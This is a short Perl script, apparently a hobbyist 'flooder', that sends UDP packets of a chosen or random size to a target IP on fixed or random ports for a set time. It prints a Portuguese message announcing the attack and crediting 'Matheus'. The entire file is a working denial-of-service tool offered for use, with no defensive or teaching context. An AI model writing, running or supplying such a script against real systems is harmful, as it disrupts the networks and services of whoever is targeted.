
use Socket;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Usage: perl theus.pl <Target> <Port> <Packet Size> <Time>\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print "Atacando $ip na porta $port pacotes $size pacotes de bytes para $time seconds\n";
print "IP atacado por Matheus\n";

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","01010101"), 0, pack_sockaddr_in($pport, $iaddr));}
